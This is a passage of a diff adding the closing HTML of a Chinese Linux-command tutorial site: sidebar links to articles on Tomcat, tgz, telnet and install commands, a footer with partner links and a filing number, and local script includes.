+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/qsjjtcqwtlzd/" rel="bookmark">轻松解决Tomcat重启问题：Linux中的Tomcat重启命令</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/qsjjlxtjywtz/" rel="bookmark">轻松解决Linux下tgz解压问题，掌握解压命令！</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/qsglfwqzwtml/" rel="bookmark">轻松管理服务器，掌握telnet linux命令！</a> </li>
+							
+							<li class="clearfix format-standard"> <a href="https://wonima136.github.io/linux-cool/knowledge/qsgdlazzwiml/" rel="bookmark">轻松搞定Linux安装，掌握install命令！</a> </li>
+							
+						</ul>
+
+                    </div>
+                </aside>
+                </div>
+            </div>
+   <footer id="site-footer" class="clearfix" role="contentinfo"> 
+    <div class="ht-container"> 
+     <style>
+          .flink-class a {
+              line-height: 20px;
+          }
+      </style> 
+     <div class="flink-class" style="max-width: 550px;float: left;margin-top: 30px;margin-left: 30px;">
+      <strong>友情链接：</strong> 
+	  
+      <a href="https://www.linuxpack.net" target="_blank" rel="noopener">Linux软件</a> | 
+	  
+      <a href="https://www.linuxjiaocheng.com" target="_blank" rel="noopener">Linux教程</a> | 
+	  
+      <a href="https://www.bestcentos.com" target="_blank" rel="noopener">CentOS系统</a> | 
+	  
+     </div> 
+	 
+	 
+	 <ul>
+
+
+	 
+	 
+
+	 
+     <small id="copyright">
+
+	 <p style="text-align: center;"><a href="https://beian.miit.gov.cn" target="_blank" rel="noopener">粤ICP备0000000号</a></p>
+
+	 <p style="text-align: center;"><strong>真正好用的Linux命令在线查询手册</strong><a id="dididomian1" style="padding: 0px; margin: 0px; font-family: 'Microsoft yahei', PingFangSC-Regular; color: #ff1122; font-size: 15px; position: relative;" data-tips="关键词已经复制成功，请到您的网站添加吧(#^.^#)" data-clipboard-action="copy" data-clipboard-target="#dididomian1"></a></p>
+	 </small> 
+    </div> 
+   </footer> 
+  </div> 
+  
+  <script src="/js/search.js"></script>
+  <script type="text/javascript" src="/js/ht-glossary-frontend.js" id="htgb-custom-js-js"></script> 
+  <script type="text/javascript" src="/js/script.min.js" id="ht_toc-script-js-js"></script> 
+  <script type="text/javascript" src="/js/shortcodes.js" id="shortcodes-js-js"></script> 
+  <script type="text/javascript" src="/js/functions.js" id="st_theme_custom-js"></script> 
+  <script type="text/javascript" src="/js/livesearch.js" id="st_live_search-js"></script>   
+  
+</body>
+
+</html>
+
+
